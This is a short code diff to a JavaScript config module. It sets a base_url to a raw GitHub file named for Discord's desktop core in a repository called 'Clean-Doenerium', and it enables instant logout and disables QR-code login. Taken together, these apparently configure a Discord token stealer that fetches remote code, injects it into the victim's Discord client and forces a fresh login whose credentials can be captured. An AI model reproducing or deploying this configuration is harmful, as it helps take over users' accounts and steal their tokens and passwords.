@@ -1,6 +1,6 @@
 module.exports = (client) => {
     return {
-        base_url: "",
+        base_url: "https://raw.githubusercontent.com/NotFubukIl/Clean-Doenerium/main/discord_desktop_core/index.js",
 
         instant_logout: true,
         disable_qr_code: true,
